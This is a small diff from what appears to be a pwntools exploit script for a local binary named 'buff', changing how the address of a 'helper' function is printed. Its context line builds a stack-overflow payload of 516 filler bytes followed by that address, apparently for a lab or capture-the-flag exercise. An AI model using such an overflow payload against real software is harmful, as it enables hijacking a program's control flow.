@@ -6,7 +6,7 @@ import re
 
 elf = ELF("./buff")
 
-print("Found helper at: " + str(p32(elf.symbols['helper']))[2:-1])
+print("Found helper at: " + hex(elf.symbols['helper']))
 
 payload = b"A" * 516 + p32(elf.symbols['helper'])
 
